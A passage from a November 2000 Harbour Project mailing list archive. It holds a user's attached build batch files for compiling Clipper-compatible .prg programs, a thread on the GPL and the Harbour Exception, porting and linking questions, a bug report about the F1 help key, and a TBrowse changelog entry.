	name="HA.BAT"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
	filename="HA.BAT"

harbour MESTO.prg -m > build.log
harbour funnet.prg -n -m   >> build.log
harbour ERRORSYS.prg  -m -n  >> build.log
harbour funesp.prg  -m -n  >> build.log
harbour COMPROB.prg -m   >> build.log
harbour IMPRE.prg  -m -n  >> build.log
harbour CAJA.prg   -m >> build.log
harbour  GETSYS.prg  -m -n  >> build.log
harbour MODART.prg   -m -n >> build.log
harbour  LISART.prg  -m  >> build.log
harbour  TABLA.prg   -m >> build.log
harbour MECC.prg   -m >> build.log
harbour LIBRO.prg  -m  >> build.log
harbour  altmod.prg  -m -n  >> build.log
harbour MEMO.prg   -m >> build.log
harbour tbdemo.prg  -m -n  >> build.log
harbour reloj.prg  -m -n  >> build.log
harbour mefab.prg  -m -n  >> build.log
harbour ordenp.prg  -m -n  >> build.log
harbour COMP.prg   -m >> build.log
harbour comp2.prg  -m -n  >> build.log
harbour HASANP.prg -m  -n  >> build.log
harbour HASAN.prg  -m -n  >> build.log
harbour RDDSYS.prg  -m -n  >> build.log
harbour FUNNET2.prg  -m -n  >> build.log

------=_NextPart_000_0071_01C050D0.05DF16E0
Content-Type: application/octet-stream;
	name="me.bat"
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename="me.bat"

@echo off
rem
rem $Id: bld.bat,v 1.12 2000/04/23 10:19:50 vszel Exp $
rem

rem ---------------------------------------------------------------
rem Template to build a final Harbour executable, using Harbour
rem with the C code generation feature, then calling the proper C
rem linker/compiler.
rem
rem Copyright 1999-2000 Victor Szakats (info@szelvesz.hu)
rem See doc/license.txt for licensing terms.
rem ---------------------------------------------------------------

rem if "%HB_ARCHITECTURE%" =3D=3D "" set HB_ARCHITECTURE=3Ddos
rem if "%HB_COMPILER%" =3D=3D "" set HB_COMPILER=3Ddjgpp
rem if "%HB_GT_LIB%" =3D=3D "" set HB_GT_LIB=3D

:START

   if "%HB_ARCHITECTURE%" =3D=3D "" goto NO_ARCH
   if "%HB_COMPILER%" =3D=3D "" goto NO_COMP

   goto COMPILE
        if not "%1" =3D=3D "" goto COMPILE

:HELP

   echo.
   echo Usage: bld filename
   echo.
   echo Notes:
   echo.
   echo   - 'filename' is the .prg filename *without* extension.
   echo   - Don't forget to make a MAIN() function for you application.
   echo   - This batch file assumes you are in some directory off the =
main
   echo     harbour directory.
   echo   - Environment variables HB_ARCHITECTURE, HB_COMPILER, =
HB_GT_LIB
   echo     should be set. Setting HB_GT_LIB is optional.
   echo     The following values are currently supported:
   echo.
   echo     HB_ARCHITECTURE:
   echo       - dos   (HB_GT_LIB=3Dgtdos by default)
   echo       - w32   (HB_GT_LIB=3Dgtw32 by default)
   echo       - linux (HB_GT_LIB=3Dgtstd by default)
   echo       - os2   (HB_GT_LIB=3Dgtos2 by default)
   echo.
   pause
   echo     HB_COMPILER:
   echo       - When HB_ARCHITECTURE=3Ddos
   echo         - bcc16   (Borland C++ 3.x, 4.x, 5.0x, DOS 16-bit)
   echo         - djgpp   (Delorie GNU C, DOS 32-bit)
   echo         - rxs32   (EMX/RSXNT/DOS GNU C, DOS 32-bit)
   echo         - watcom  (Watcom C++ 9.x, 10.x, 11.x, DOS 32-bit)
   echo       - When HB_ARCHITECTURE=3Dw32
   echo         - bcc32   (Borland C++ 4.x, 5.x, Windows 32-bit)
   echo         - gcc     (Cygnus/Cygwin GNU C, Windows 32-bit)
   echo         - mingw32 (Cygnus/Mingw32 GNU C, Windows 32-bit)
   echo         - rxsnt   (EMX/RSXNT/Win32 GNU C, Windows 32-bit)
   echo         - icc     (IBM Visual Age C++, Windows 32-bit)
   echo         - msvc    (Microsoft Visual C++, Windows 32-bit)
   echo       - When HB_ARCHITECTURE=3Dlinux
   echo         - gcc     (GNU C, 32-bit)
   echo       - When HB_ARCHITECTURE=3Dos2
   echo         - gcc     (EMX GNU C, OS/2 32-bit)
   echo         - icc     (IBM Visual Age C++ 3.0, OS/2 32-bit)
   echo.
   pause
   echo     HB_GT_LIB:
   echo       - gtstd (Standard streaming) (for all architectures)
   echo       - gtdos (DOS console)        (for dos architecture)
   echo       - gtwin (Win32 console)      (for w32 architecture)
   echo       - gtos2 (OS/2 console)       (for os2 architecture)
   echo       - gtpca (PC ANSI console)    (for all architectures)
   echo       - gtcrs (Curses console)     (for linux, w32 =
architectures)
   echo       - gtsln (Slang console)      (for linux, w32 =
architectures)
   goto END

:NO_ARCH

   echo Error: HB_ARCHITECTURE is not set.
   goto HELP

:NO_COMP

   echo Error: HB_COMPILER is not set.
   goto HELP

:BAD_ARCH

   echo Error: HB_ARCHITECTURE value is unsupported.
   goto HELP

:BAD_COMP

   echo Error: HB_COMPILER value is unsupported.
   goto HELP

:COMPILE
goto EDU
   harbour %1.prg -n -i..\include %2 %3 %HARBOURFLAGS%

:A_DOS

   if not "%HB_GT_LIB%" =3D=3D "" set _HB_GT_LIB=3D%HB_GT_LIB%

   if not "%HB_ARCHITECTURE%" =3D=3D "dos" goto A_W32

   if "%HB_GT_LIB%" =3D=3D "" set _HB_GT_LIB=3Dgtdos

   if not "%HB_COMPILER%" =3D=3D "bcc16" goto A_DOS_BCC16_NOT

      echo -O2 -d -mh %CFLAGS% -I..\include -L..\lib > build.tmp
      echo -e%1.exe %1.c >> build.tmp
      echo debug.lib >> build.tmp
      echo vm.lib >> build.tmp
      echo rtl.lib >> build.tmp
      echo %_HB_GT_LIB%.lib >> build.tmp
      echo lang.lib >> build.tmp
      echo rdd.lib >> build.tmp
      echo macro.lib >> build.tmp
      echo pp.lib >> build.tmp
      echo dbfntx.lib >> build.tmp
      echo dbfcdx.lib >> build.tmp
      echo common.lib >> build.tmp
      bcc @build.tmp
      del build.tmp
      goto END

:A_DOS_BCC16_NOT

   if not "%HB_COMPILER%" =3D=3D "djgpp" goto A_DOS_DJGPP_NOT

      echo %1.c -o%1.exe %CFLAGS% -I..\include -L..\lib > build.tmp
      echo -ldebug >> build.tmp
      echo -lvm >> build.tmp
      echo -lrtl >> build.tmp
      echo -l%_HB_GT_LIB% >> build.tmp
      echo -llang >> build.tmp
      echo -lrdd >> build.tmp
      echo -lrtl >> build.tmp
      echo -lvm >> build.tmp
      echo -lmacro >> build.tmp
      echo -lpp >> build.tmp
      echo -ldbfnt >> build.tmp
      echo -ldbfcd >> build.tmp
      echo -lcommo >> build.tmp
      gcc @build.tmp
      del build.tmp
      goto END

:A_DOS_DJGPP_NOT

   if "%HB_COMPILER%" =3D=3D "rsx32"   gcc %1.c -Zrsx32 %CFLAGS% =
-I..\include -L..\lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% -llang -lrdd =
-lrtl -lvm -lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   goto END

:A_W32

   if not "%HB_ARCHITECTURE%" =3D=3D "w32" goto A_OS2

   if "%HB_GT_LIB%" =3D=3D "" set _HB_GT_LIB=3Dgtwin
   if "%HB_COMPILER%" =3D=3D "bcc32" goto EDU

REM    echo on
REM    if "%HB_COMPILER%" =3D=3D "bcc32"   bcc32 -O2 -d %CFLAGS% =
-I..\include -L..\lib %1.c debug.lib vm.lib rtl.lib %_HB_GT_LIB%.lib =
lang.lib rdd.lib macro.lib pp.lib dbfntx.lib dbfcdx.lib common.lib
REM    echo off
   if "%HB_COMPILER%" =3D=3D "gcc"     gcc %1.c -o%1.exe %CFLAGS% =
-I..\include -L..\lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% -llang -lrdd =
-lrtl -lvm -lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   if "%HB_COMPILER%" =3D=3D "mingw32" gcc %1.c -o%1.exe %CFLAGS% =
-mno-cygwin -I..\include -L..\lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% =
-llang -lrdd -lrtl -lvm -lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   if "%HB_COMPILER%" =3D=3D "rsxnt"   gcc %1.c -Zwin32 %CFLAGS% =
-I..\include -L..\lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% -llang -lrdd =
-lrtl -lvm -lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   if "%HB_COMPILER%" =3D=3D "msvc"    cl -TP -W3 %CFLAGS% -I..\include =
%1.c /link /subsystem:CONSOLE ..\lib\debug.lib ..\lib\vm.lib =
..\lib\rtl.lib ..\lib\%_HB_GT_LIB%.lib ..\lib\lang.lib ..\lib\rdd.lib =
..\lib\macro.lib ..\lib\pp.lib ..\lib\dbfntx.lib ..\lib\dbfcdx.lib =
..\lib\common.lib user32.lib
   if "%HB_COMPILER%" =3D=3D "msvc"    echo Ignore LNK4033 warning

   goto END

:EDU

      echo -O2 -d %CFLAGS% -I..\include -L..\lib > build.tmp
      echo -emesto.exe >> build.tmp
        echo mesto.c >> build.tmp
echo funnet.c >> build.tmp
echo ERRORSYS.c >> build.tmp
echo funesp.c >> build.tmp
echo COMPROB.c >> build.tmp
echo IMPRE.c >> build.tmp
echo CAJA.c >> build.tmp
echo GETSYS.c >> build.tmp
echo MODART.c >> build.tmp
echo LISART.c >> build.tmp
echo tABLA.c >> build.tmp
echo MECC.c >> build.tmp
echo LIBRO.c >> build.tmp
echo altmod.c >> build.tmp
echo MEMO.c >> build.tmp
echo tbdemo.c >> build.tmp
echo reloj.c >> build.tmp
echo mefab.c >> build.tmp
echo ordenp.c >> build.tmp
echo COMP.c >> build.tmp
echo comp2.c >> build.tmp
 echo HASANP.c >> build.tmp
 echo HASAN.c >> build.tmp
echo RDDSYS.c >> build.tmp
echo FUNNET2.c >> build.tmp
        echo debug.lib >> build.tmp
      echo vm.lib >> build.tmp
      echo rtl.lib >> build.tmp
      echo %_HB_GT_LIB%.lib >> build.tmp
      echo lang.lib >> build.tmp
      echo rdd.lib >> build.tmp
      echo macro.lib >> build.tmp
      echo pp.lib >> build.tmp
      echo dbfntx.lib >> build.tmp
      echo dbfcdx.lib >> build.tmp
      echo common.lib >> build.tmp
REM       echo Mdebug.lib >> build.tmp
REM      echo Mfiscal.lib >> build.tmp
      bcc32 @build.tmp  >> build.log

   echo on
rem bcc32 -O2 -d %CFLAGS%  hello.c debug.lib vm.lib rtl.lib =
%_HB_GT_LIB%.lib lang.lib rdd.lib macro.lib pp.lib dbfntx.lib dbfcdx.lib =
common.lib
      rem    bcc32 @har2.bc
   echo off
   rem bcc32 -O2 -d %CFLAGS% -I..\include -L..\lib %1.c debug.lib vm.lib =
rtl.lib %_HB_GT_LIB%.lib lang.lib rdd.lib macro.lib pp.lib dbfntx.lib =
dbfcdx.lib common.lib
   REM bcc32 -O2 -d %CFLAGS%  %1.c debug.lib vm.lib rtl.lib =
%_HB_GT_LIB%.lib lang.lib rdd.lib macro.lib pp.lib dbfntx.lib dbfcdx.lib =
common.lib
   echo off

   goto END

:A_OS2

   if not "%HB_ARCHITECTURE%" =3D=3D "os2" goto A_LINUX

   if "%HB_GT_LIB%" =3D=3D "" set _HB_GT_LIB=3Dgtos2

   if "%HB_COMPILER%" =3D=3D "gcc"     gcc %1.c %CFLAGS% -I..\include =
-L..\lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% -llang -lrdd -lrtl -lvm =
-lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   if "%HB_COMPILER%" =3D=3D "icc"     icc /Gs+ /W2 /Se /Sd+ /Ti+ /C- =
/Tp %CFLAGS% -I..\include %1.c ..\lib\debug.lib ..\lib\vm.lib =
..\lib\rtl.lib ..\lib\%_HB_GT_LIB%.lib ..\lib\lang.lib ..\lib\rdd.lib =
..\lib\rtl.lib ..\lib\vm.lib ..\lib\macro.lib ..\lib\pp.lib =
..\lib\dbfntx.lib ..\lib\dbfcdx.lib ..\lib\common.lib
   goto END

:A_LINUX

   if not "%HB_ARCHITECTURE%" =3D=3D "linux" goto BAD_ARCH

   if "%HB_GT_LIB%" =3D=3D "" set _HB_GT_LIB=3Dgtstd

   if "%HB_COMPILER%" =3D=3D "gcc"     gcc %1.c %CFLAGS% -I../include =
-L../lib -ldebug -lvm -lrtl -l%_HB_GT_LIB% -llang -lrdd -lrtl -lvm =
-lmacro -lpp -ldbfntx -ldbfcdx -lcommon
   goto END

:CLEANUP

   del %1.c

:END

------=_NextPart_000_0071_01C050D0.05DF16E0--


From harbour@lists.harbour-project.org  Fri Nov 17 17:52:01 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Fri Nov 17 17:52:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <NOEPIKLDCODGGHOPAHEECELLCCAA.Jacek.Potempa@otc.pl>
References: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com>
Message-ID: <200011172251.eAHMpDG07524@thor.parrett.net>

** Reply to message from "Jacek Potempa" <Jacek.Potempa@otc.pl> on Fri,
17 Nov 2000 23:21:15 +0100

> > 1...
> That is clear.

Actually it isn't, because that is not how things actually work. The
Harbour Compiler is under GPL. But if you use the Harbour compiler to
create an executable, then the executable qualifies under the Harbour
Exception to the GPL, which is *less* restrictive than the GPL.

> > 2.
> Following the above statement you would have to place your C/C++
> extensions to PRG programs under GPL

Except that you don't, because there is no such thing as a "Harbour
License Restriction". The Harbour Exception to the GPL is less
restrictive than the GPL. As a result, you *want* the Harbour Exception
to apply to your programs. And as a result, you do *not* have to place
*any* of your private Harbour or Harbour-related code under GPL.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Fri Nov 17 18:10:03 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Fri Nov 17 18:10:03 2000
Subject: [Harbour] Varios errores al compilar
In-Reply-To: <007401c050d0$0b0265a0$0b00a8c0@eduardo>
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org>
Message-ID: <200011172309.eAHN9LG08777@thor.parrett.net>

** Reply to message from "Eduardo Rizzolo" <fullpaint@arnet.com.ar> on
Fri, 17 Nov 2000 19:53:14 -0000

> 4)
> Utilizo una libreria externa para un controlador fiscal! FISCAL.LIB
> Con clipper trabaja bien, pero con harbour no encuentro la forma de
> enlazarla!! Se la agrege al bcc32, pero tira error. Que puedo hacer?

You can't use a library that was written for Clipper with Harbour. The
library source code must be recompiled using Harbour in order to create
a library that can be used with Harbour.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Fri Nov 17 21:06:01 2000
From: harbour@lists.harbour-project.org (=?iso-8859-1?Q?Gustavo_A._Gonz=E1lez_M.?=)
Date: Fri Nov 17 21:06:01 2000
Subject: [Harbour] Varios errores al compilar
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <007401c050d0$0b0265a0$0b00a8c0@eduardo>
Message-ID: <008e01c05103$a8ba3060$4cf4c4a1@gustavo>

Hola eduardo.

Realmente te recomiendo que no quieras llevar a harbour todo tu programa de
un solo golpe.

Recuerda que aunque son identicos, y ya esta casi listo, tienen ciertas
cositas que debes aprender antes de comenzar a trabajar como si nada.

Te recomiendo que hagas primero pruebas, con un solo prg, luego prueba tus
definiciones en ese prg, luego comienza a colocarles varios prg y asi
sucesivamente hasta obtener tu objetivo. Usa tu antiguo RMAKE no te des mala
vida con el make de borland (a menos que de verdad quieras y tengas tiempo
para investigar).

El RDD no esta 100% completado, pero ya puedes hacer pruebas.

Ademas Eduardo, si llevas todo de un solo jalon, los errores que puedan
ocurrir van a ser muy dificiles de seguir, y creo que nadie va a analizar
todo tu codigo para ver cuales son los problemas (sin menospreciar a nadie
Ok).

Hazlo por partes y ve soltando igual por partes (en la lista), los errores
que vayas
obteniendo (en INGLES my fiend).

Saludos from this side of the earth.

--
Gustavo A. González M.
gonzalezgustavo@cantv.net
Caracas - Venezuela

----- Original Message -----
From: Eduardo Rizzolo <fullpaint@arnet.com.ar>
To: <harbour@lists.harbour-project.org>
Sent: Friday, November 17, 2000 3:53 PM
Subject: [Harbour] Varios errores al compilar


> Colegas
>
> Ante todo disculpas por enviar a una lista para lenguaje ingles, esta
> consulta en español, pero la lista de español no se mueve!!  :::(((((
>
> Efectue la primer compilacion, y tengo los siguientes errores:
>
> 1)
> Esta comparacion no funciono:
>          IF NUM1 # LINEA->NUMERO
> Esta no tiene problemas:
>          IF NUM1 != LINEA->NUMERO
> 2) Adjunto build.log con detalle de compilacion
> Tube problemas con el set scope to
> Reemplace por ordscope() y no tube problemas.
>
> 3)
> Tengo echa esta definicion:
> #xtranslate T => aArrayVars\[13\]
> Se confunde e intenta cambiar .T. generando un error.
> .aArrayVars[13].  // este es el reemplazo efectuado en el ppo
> Con clipper no hay problema!!
> Tampoco es muy grave, con solo declarar otra variable se soluciona, pero
hay
> problema de incompatibilidad.
> Seguro que ocurre el mismo error si la variable es F, y se utiliza .F.
>
> 4)
> Utilizo una libreria externa para un controlador fiscal!
> FISCAL.LIB
> Con clipper trabaja bien, pero con harbour no encuentro la forma de
> enlazarla!!
> Se la agrege al bcc32, pero tira error.
> Que puedo hacer?
>
> 5)
> Envio los archivos que utilizo de enlace.
> Me pueden decir si esta bien asi?
>
>
> Muchas gracias
>
>
> Eduardo Rizzolo
> Posadas Misiones Argentina
> fullpaint@arnet.com.ar
> fullpaint@flashmail.com
> icq 39280741
>
> ----- Original Message -----
> From: Dave Pearson <davep@davep.org>
> To: <harbour@lists.harbour-project.org>
> Sent: Friday, November 17, 2000 6:04 PM
> Subject: Re: [Harbour] Harbour license
>
>
> > On Fri, Nov 17, 2000 at 09:01:30AM -0800, Ron Pinkas wrote:
> >
> > > 1. Is the output of the compiler, in the form of the generated C,
Java,
> > > Win32 Object, and HRB, resulting from USER developed PRG code, subject
> to
> > > any Harbour License Restrictions, or control?
> > >
> > >    The answer is a CLEAR NO! But I doubt it come across that way, from
> > > reading the "License Header".
> >
> > People shouldn't be looking in the "licence header" for that sort of
> > information, they should be looking in the licence itself. This issue is
> > addressed in the licence:
> >
> > ,----[ Excerpt from the GPL ]
> > | The act of running the Program is not restricted, and the output from
> the
> > | Program is covered only if its contents constitute a work based on the
> > | Program (independent of having been made by running the Program).
> Whether
> > | that is true depends on what the Program does.
> > `----
> >
> > I don't think I've seen anyone ask if the *output* of the compiler is
> > considered a derived work. I can easily add such information to the FAQ
if
> > the developers think it might help (hmm, perhaps there is some scope for
a
> > "Dummies Guide to the Harbour Licence").
> >
> > > I believe this is where the core of the matter is. Assume for a
second,
> > > that John Doe developed a Harbour compatible PCODE compiler, but he
> didn't
> > > bother developing the RTL or HVM. Surely, we don't won't to allow Mr.
> Doe,
> > > to distribute the Harbour HVM/RTL, in ANY form, capable of servicing
the
> > > PCODE output of his compiler, *unless* subjecting the resulted form to
> the
> > > Harbour License Agreement.
> >
> > There is no reason why someone couldn't write their own harbour
compatible
> > compiler, that isn't free, and have it use the HVM and HRL as long as
said
> > author distributes the HVM and HRL as per the licence. I can't see why
> that
> > would be undesirable. Well, personally I'd find it undesirable but as
long
> > as the compiler itself isn't a derived work of harbour then it would be
> well
> > within the terms of the harbour licence.
> >
> > > 1. The License for the Harbour Compiler (source files involved with
> building
> > > Harbour.exe) should be strait forward, indicating, that any use of
these
> > > source files, subjects the derived work/distribution to the GPL. It
> should
> > > further be clear that the compiled output of any user's prg code,
> compiled
> > > by the compiler application, is *not* subject to any Harbour License
> > > Restrictions.
> >
> > That's what we're supposed to have at the moment, modulo any compiler
code
> > that is also used at run-time. See my alert regarding this the other
week.
> >
> > > 2. The License for the RTL (source files involved with building the
> Harbour
> > > Run-Time Libraries) should clearly state, that any use of these source
> > > files, subjects the derived work/distribution to the GPL. It should
> further
> > > be clear that the *compiled* form of these files *can* be linked with
> source
> > > files generated by the Harbour Compiler, and can service such Harbour
> > > generated source code, compiled by the compiler application, *without*
> > > subjecting the resulted form, to any Harbour License Restrictions.
> >
> > That's what we're supposed to have at the moment, it's my understanding
> that
> > that is what we have.
> >
> > > 3. The License for the HVM (source files involved with building the
> Harbour
> > > Virtual Machine) should clearly state, that any use of these source
> files,
> > > subjects the derived work/distribution to the GPL. It should further
be
> > > clear that the *compiled* form of these files *can* be linked with
> source
> > > files generated by the Harbour Compiler, and can service such Harbour
> > > generated source code, compiled by the Harbour compiler application,
> without
> > > subjecting the resulted form, to any Harbour License Restrictions.
> >
> > Which reads the same as 2, which is pretty much what we've got right
now.
> >
> > --
> > The Harbour Project: A free software Clipper compatible compiler
> > Home Page..........: http://www.harbour-project.org/
> > FAQ................: http://www.harbour-project.org/faq/harbour.html
> > My harbour page....: http://www.hagbard.demon.co.uk/harbour/
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> >
>




From harbour@lists.harbour-project.org  Fri Nov 17 22:33:01 2000
From: harbour@lists.harbour-project.org (April)
Date: Fri Nov 17 22:33:01 2000
Subject: [Harbour] bug in F1 default behaviour
References: <3A12433E.5751@synel.co.il>
Message-ID: <3A15F874.C712ACD7@user.rose.com>

Chen Kedem wrote:

> F1 is set by default to function called 'help',
> Harbour fail to pass PROCNAME(), PROCLINE(), READVAR()
> when the default setting is used, it is Ok when I manually
> SET KEY K_F1 to help.

Though I wrote the setkey code, the F1 help code is not mine.  I'm not
sure,
but I think the problem is in rtl\xhelp.c:

   PHB_DYNS pDynSym = hb_dynsymFind( "HELP" );
   if( pDynSym )
   {
      hb_vmPushSymbol( pDynSym->pSymbol );
      hb_vmPushNil();
      hb_vmDo( 0 );

      /* NOTE: Leave the return value as it is. */
   }

where F1 is set to __xhelp (the above function).

I have not done a download in several weeks, so I am not in a position to
fix
this.

April


From harbour@lists.harbour-project.org  Fri Nov 17 23:42:01 2000
From: harbour@lists.harbour-project.org (Phil Barnett)
Date: Fri Nov 17 23:42:01 2000
Subject: [Harbour] Harbour license
In-Reply-To: <20001117091731.L18577@hagbard.davep.org>
References: <200011170352_MC2-BB31-F9AB@compuserve.com>; from John_Skelton@compuserve.com on Fri, Nov 17, 2000 at 03:52:29AM -0500
Message-ID: <3A15C22F.8223.466C3B9@localhost>

On 17 Nov 2000, at 9:17, Dave Pearson wrote:

> Apologies for my misunderstanding. Ron and you are really talking
> about something that is a non-issue. If code isn't combined with code
> that is under our licence that it's not "worth talking about", it's
> non of our business and the GPL doesn't affect it and the harbour
> exception doesn't speak to or about it. Hence my confusion, your
> mention of this suggested to be that you were talking about code that
> is combined with harbour code (this coming from a discussion about
> executables, an executable been a form of distributing user's code
> that *is* combined with harbour code).

How about uncompiled code that is not in the Harbour Exception.

For example, many of us include errorsys.prg and modify it.

Since it's not part of the VM and now not part of the library, does 
that effect our personal licensing rights?


-- 
              Phil Barnett  mailto:midnight@the-oasis.net
                       WWW  http://www.the-oasis.net/
                  FTP Site  ftp://ftp.the-oasis.net

From harbour@lists.harbour-project.org  Sat Nov 18 01:16:00 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Sat Nov 18 01:16:00 2000
Subject: [Harbour] Harbour license
In-Reply-To: <007201c050d0$7d4de350$59f6fbce@local>; from bhays@abacuslaw.com on Fri, Nov 17, 2000 at 11:56:34AM -0800
References: <20001117153044.V18577@hagbard.davep.org> <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <20001117180425.C18577@hagbard.davep.org> <007201c050d0$7d4de350$59f6fbce@local>
Message-ID: <20001117230048.E18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 11:56:34AM -0800, Brian Hays wrote:
> Dave:
> > People shouldn't be looking in the "licence header" for that sort of
> > information, they should be looking in the licence itself. This issue is
> > addressed in the licence:
> 
> But people look where they look, and we should anticipate that.

Oooo, disagree lots. People *must* read the licence. Not doing so is
terribly dangerous. I don't have a problem with providing a primer or some
form of help document but everything must be done to (I hate to use the
word) force people to read the licence.

> Obviously a lot of smart people fall into the Dummies category. The "fine
> print" and exceptions create doubt in what should be the simple part, so
> we all have to ask for clarification. I think the kind of clear language
> Ron used was very helpful in removing the doubt for the basics, which lets
> the reader approach the complications from firmer ground.

The hard part about this is knowing if the clear language is valid language.
We can communicate intent, that's good, but if the intent differs from the
implementation (the licence), that's bad.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Sat Nov 18 03:25:04 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Sat Nov 18 03:25:04 2000
Subject: [Harbour] Harbour license
In-Reply-To: <200011171721_MC2-BB48-AF03@compuserve.com>; from John_Skelton@compuserve.com on Fri, Nov 17, 2000 at 05:21:17PM -0500
References: <200011171721_MC2-BB48-AF03@compuserve.com>
Message-ID: <20001118082209.I18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 05:21:17PM -0500, John Skelton wrote:

> > The files the compiler outputs generally seem to contain things which
> > _might_ be construed as Harbour code. E.g. looking at some C there's lots
> > of stuff that each has in common. 
> 
> "What would be an example of this?"
> 
> Any C file resulting from compiling a PRG.

That's ok, that's simply output from the compiler. The GPL speaks about
output and I think all we need to do here is clarify the status of the
output.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Sat Nov 18 03:25:26 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Sat Nov 18 03:25:26 2000
Subject: [Harbour] Harbour license
In-Reply-To: <3A15C22F.8223.466C3B9@localhost>; from midnight@the-oasis.net on Fri, Nov 17, 2000 at 11:41:35PM -0500
References: <200011170352_MC2-BB31-F9AB@compuserve.com>; <20001117091731.L18577@hagbard.davep.org> <3A15C22F.8223.466C3B9@localhost>
Message-ID: <20001118081643.G18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 11:41:35PM -0500, Phil Barnett wrote:

> How about uncompiled code that is not in the Harbour Exception.
> 
> For example, many of us include errorsys.prg and modify it.

ERRORSYS.PRG is licenced under the GPL and any derived work has to be
distributed in accordance with the GPL. Including a modified version of
ERRORSYS.PRG in your application will cause you licence issues.

> Since it's not part of the VM and now not part of the library, does that
> effect our personal licensing rights?

Very much.

I would suggest to the copyright holder of ERRORSYS.PRG that they either
choose a more liberal licence for that file or they consider giving up
copyright altogether and placing the file in the public domain.

Antonio?

Failing that (and I can imagine that there are other files similar to this)
we need to think about reviewing the exception and what it says. Not a
simple job.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Sat Nov 18 03:26:07 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Sat Nov 18 03:26:07 2000
Subject: [Harbour] Harbour license
In-Reply-To: <200011172251.eAHMpDG07524@thor.parrett.net>; from dholm@jsd-llc.com on Fri, Nov 17, 2000 at 05:50:49PM -0500
References: <LOBBKAFMMFGJIKLMEPAKCEDFDHAA.ron@profit-master.com> <NOEPIKLDCODGGHOPAHEECELLCCAA.Jacek.Potempa@otc.pl> <200011172251.eAHMpDG07524@thor.parrett.net>
Message-ID: <20001118082100.H18577@hagbard.davep.org>

On Fri, Nov 17, 2000 at 05:50:49PM -0500, David G. Holm wrote:
> ** Reply to message from "Jacek Potempa" <Jacek.Potempa@otc.pl> on Fri,
> 17 Nov 2000 23:21:15 +0100
> 
> > > 1...
> > That is clear.
> 
> Actually it isn't, because that is not how things actually work. The
> Harbour Compiler is under GPL. But if you use the Harbour compiler to
> create an executable, then the executable qualifies under the Harbour
> Exception to the GPL, which is *less* restrictive than the GPL.

That isn't clear either because the harbour compiler doesn't create
executables (although HRB files do add an interesting dimension to this).
Also, the use of the harbour compiler isn't the thing that invokes the
harbour exception, it's the aggregation of the HVM and HRL with other code
that causes you to consider the exception.

> Except that you don't, because there is no such thing as a "Harbour
> License Restriction". The Harbour Exception to the GPL is less restrictive
> than the GPL. As a result, you *want* the Harbour Exception to apply to
> your programs. And as a result, you do *not* have to place *any* of your
> private Harbour or Harbour-related code under GPL.

*unless* the code in question is a derived work of existing harbour code
(see Phil's question about ERRORSYS.PRG for example).

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Sat Nov 18 05:20:05 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Sat Nov 18 05:20:05 2000
Subject: [Harbour] CHANGELOG: 2000-11-18 11:11 GMT+1
Message-ID: <3A165795.6B0CF750@libero.it>

2000-11-18 11:11 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/tbrowse.prg
      * drawing headers and footers is not needed if columns on screen
don't change,
        before this change they were redrawn every time first row
changed.
      ! fixed wrong redrawing of TBrowse if a down on last row was
issued followed by
        an horizontal movement requiring an ::Invalidate()
   * source/rtl/tbcolumns.prg
      + added missing picture ivar.
-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Sat Nov 18 05:53:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Sat Nov 18 05:53:01 2000
Subject: [Harbour] win98 and TBrowse
